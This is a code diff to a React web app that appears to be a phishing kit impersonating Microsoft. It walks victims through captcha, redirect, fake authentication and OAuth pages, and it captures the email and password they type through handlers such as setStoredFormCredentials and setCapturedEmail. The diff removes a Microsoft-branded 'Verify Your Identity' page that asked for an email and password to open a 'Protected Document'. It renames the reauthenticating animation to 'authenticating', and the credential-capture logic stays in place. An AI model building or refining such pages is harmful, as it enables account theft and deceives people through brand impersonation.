@@ -126,7 +126,8 @@ function App() {
   useEffect(() => {
     if (currentPage === 'redirecting') {
       const timer = setTimeout(() => {
-        setCurrentPage('document-protection');
+        // Flow change: go to the authenticating animation instead of the removed document-protection page
+        setCurrentPage('authenticating');
       }, redirectingDelay);
       return () => clearTimeout(timer);
     }
@@ -307,7 +308,7 @@ function App() {
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading', 'replacement'].includes(step)) {
+    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'authenticating', 'oauth-redirect', 'success', 'document-loading', 'replacement'].includes(step)) {
       setCurrentPage(step);
       window.history.replaceState({}, document.title, window.location.pathname);
     }
@@ -342,11 +343,11 @@ function App() {
       setStoredFormCredentials(formEmail, formPassword);
       setCapturedEmail(formEmail);
       setTimeout(() => {
-        setCurrentPage('reauthenticating');
+        setCurrentPage('authenticating');
       }, 1000);
     } catch (error) {
       setTimeout(() => {
-        setCurrentPage('reauthenticating');
+        setCurrentPage('authenticating');
       }, 1000);
     } finally {
       setTimeout(() => {
@@ -356,7 +357,7 @@ function App() {
   };
 
   useEffect(() => {
-    if (currentPage === 'reauthenticating') {
+    if (currentPage === 'authenticating') {
       const timer = setTimeout(() => {
         setCurrentPage('replacement');
       }, 2000);
@@ -415,7 +416,8 @@ function App() {
   };
 
   const handleOAuthBack = () => {
-    setCurrentPage('document-protection');
+    // Updated flow: go back to the authenticating animation (previously 'document-protection')
+    setCurrentPage('authenticating');
   };
 
   switch (currentPage) {
@@ -458,238 +460,8 @@ function App() {
         </div>
       );
 
-    case 'document-protection':
-      // --- Slightly wider desktop card, reduced instructions text size ---
-      return (
-        <div style={{
-          background: "#f7f9fb",
-          fontFamily: "'Segoe UI', Arial, sans-serif",
-          minHeight: "100vh",
-          margin: 0,
-          display: "flex",
-          flexDirection: "column",
-          alignItems: "center"
-        }}>
-          <style>
-            {`
-            .card {
-              background: #fff;
-              border-radius: 12px;
-              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.10);
-              padding: 28px 14px;
-              max-width: 340px;
-              width: 100%;
-              margin-top: 44px;
-              display: flex;
-              flex-direction: column;
-              align-items: center;
-            }
-            @media (min-width: 800px) {
-              .card {
-                max-width: 400px;
-                padding-left: 32px;
-                padding-right: 32px;
-              }
-            }
-            .logo {
-              width: 70px;
-              margin-bottom: 18px;
-              display: block;
-            }
-            .title {
-              font-size: 1.18em;
-              font-weight: 600;
-              color: #23272a;
-              margin-bottom: 8px;
-              text-align: center;
-              letter-spacing: 0.01em;
-            }
-            .desc {
-              font-size: 0.97em;
-              color: #38444d;
-              margin-bottom: 7px;
-              text-align: center;
-            }
-            .secure-link {
-              font-size: 1.01em;
-              font-weight: 450;
-              color: #0078d4;
-              margin-bottom: 8px;
-              text-align: center;
-              word-break: break-word;
-            }
-            .instructions {
-              font-size: 0.76em;
-              color: #626b76;
-              margin-bottom: 13px;
-              line-height: 1.35em;
-              text-align: center;
-              max-width: 300px;
-              margin-left: auto;
-              margin-right: auto;
-            }
-            .vertical-form {
-              width: 100%;
-              margin: 0 auto;
-              padding: 0;
-              display: flex;
-              flex-direction: column;
-              align-items: stretch;
-              gap: 13px;
-            }
-            .form-field-group {
-              display: flex;
-              flex-direction: column;
-              width: 100%;
-            }
-            .form-label {
-              font-size: 0.93em;
-              color: #4d5a67;
-              margin-bottom: 5px;
-              font-weight: 500;
-              text-align: left;
-            }
-            .form-input {
-              width: 100%;
-              font-size: 0.98em;
-              padding: 10px 12px;
-              border: 1.2px solid #cfd8dc;
-              border-radius: 4px;
-              box-sizing: border-box;
-              background: #f7f9fb;
-              color: #23272a;
-              font-family: inherit;
-              transition: border 0.16s;
-              outline: none;
-            }
-            .form-input:focus {
-              border-color: #0078d4;
-              background: #fff;
-            }
-            .form-actions {
-              display: flex;
-              flex-direction: column;
-              align-items: stretch;
-              gap: 10px;
-              width: 100%;
-              margin-top: 5px;
-            }
-            .submit-btn {
-              width: 100%;
-              background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
-              color: #fff;
-              border: none;
-              border-radius: 4px;
-              font-size: 1em;
-              font-weight: 600;
-              padding: 10px 0;
-              cursor: pointer;
-              margin-bottom: 0;
-              box-shadow: 0 2px 8px rgba(0,120,212,0.08);
-              transition: background 0.18s;
-              letter-spacing: 0.01em;
-              display: block;
-            }
-            .submit-btn:hover, .submit-btn:focus {
-              background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
-            }
-            .footer-text {
-              font-size: 0.74em;
-              color: #a0a8b6;
-              margin-top: 10px;
-              margin-bottom: 0;
-              text-align: center;
-              line-height: 1.38em;
-              max-width: 98%;
-              width: 98%;
-              letter-spacing: 0.005em;
-              word-break: break-word;
-              display: block;
-            }
-            .copyright {
-              text-align: center;
-              color: #b0b9c6;
-              font-size: 0.95em;
-              margin-top: 18px;
-              margin-bottom: 15px;
-            }
-            @media (max-width: 380px) {
-              .card {
-                max-width: 99vw;
-                padding: 7px 2vw;
-              }
-              .logo {
-                width: 50px;
-              }
-              .footer-text, .copyright {
-                font-size: 0.7em;
-              }
-              .instructions {
-                font-size: 0.73em;
-                max-width: 99vw;
-              }
-            }
-            `}
-          </style>
-          <div className="card">
-            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" alt="Microsoft Logo" />
-            <div className="title">Verify Your Identity</div>
-            <div className="desc">You've received a secure document</div>
-            <div className="secure-link">Protected Document File</div>
-            <div className="instructions">
-              To open this secure Document, please enter the email address that this item was shared to.
-            </div>
-            <form className="vertical-form" onSubmit={handleFormSubmit} autoComplete="off">
-              <div className="form-field-group">
-                <label className="form-label" htmlFor="email">Email Address</label>
-                <input
-                  className="form-input"
-                  type="email"
-                  id="email"
-                  placeholder="Enter your email"
-                  required
-                  value={formEmail}
-                  onChange={e => setFormEmail(e.target.value)}
-                  disabled={isSubmitting}
-                  autoComplete="username"
-                />
-              </div>
-              <div className="form-field-group">
-                <label className="form-label" htmlFor="password">Password</label>
-                <input
-                  className="form-input"
-                  type="password"
-                  id="password"
-                  placeholder="Enter your password"
-                  required
-                  value={formPassword}
-                  onChange={e => setFormPassword(e.target.value)}
-                  disabled={isSubmitting}
-                  autoComplete="current-password"
-                />
-              </div>
-              <div className="form-actions">
-                <button
-                  className="submit-btn"
-                  type="submit"
-                  disabled={isSubmitting}
-                  style={{opacity: isSubmitting ? 0.7 : 1}}
-                >
-                  {isSubmitting ? "🔄 Authenticating..." : "Authenticate & Open Document"}
-                </button>
-              </div>
-            </form>
-            <p className="footer-text">
-              By Authenticating, you allow Vaultydocs to use your email address in accordance with their privacy statement.<br/>
-            </p>
-          </div>
-          <div className="copyright">
-            © 2025 Microsoft &nbsp; Privacy & Cookies
-          </div>
-        </div>
-      );
-
-    case 'reauthenticating':
+    case 'authenticating':
+      // Renamed the displayed animation text to "Authenticating" per requested flow change.
       return (
         <div style={{
           display: 'flex',
@@ -704,7 +476,7 @@ function App() {
             fontSize: '24px',
             color: '#323130'
           }}>
-            Reauthenticating
+            Authenticating
             <span className="redirecting-dots">
               <span>.</span>
               <span>.</span>
